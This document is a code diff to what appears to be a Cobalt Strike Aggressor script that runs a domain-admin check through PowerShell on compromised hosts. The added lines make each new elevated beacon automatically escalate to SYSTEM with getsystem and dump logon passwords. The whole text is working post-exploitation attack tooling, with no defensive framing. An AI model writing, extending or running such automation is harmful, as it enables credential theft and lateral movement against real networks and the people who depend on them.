@@ -1,10 +1,10 @@
-# quickly run Powerview
-sub powerview {
+ # quickly run powershellimport
+sub powershellimport {
   bpowershell_import($1, script_resource("Invoke-DACheck.ps1"));
 }
 
 alias checkda {
-  powerview($1);
+  powershellimport($1);
   bpowershell($1, 'Invoke-DACheck');
 }
 
@@ -16,10 +16,19 @@ beacon_command_register(
 
 # set up the Initial check
 on beacon_initial {
-  powerview($1);
+  powershellimport($1);
   bpowershell($1, 'Invoke-DACheck -Initial True');
+  $a = binfo($1, "user");
+  $b = "*";
+  if ($b isin $a)
+    {
+    bgetsystem($1);
+    blogonpasswords($1);
+    }
 }
 
+
+#NEED TO SETUP A CHECK ARRAY FOR PAST DA FINDS
 # set up event consumer to search for specfic pattern
 # if found alert them via Elog and box
 on beacon_output {
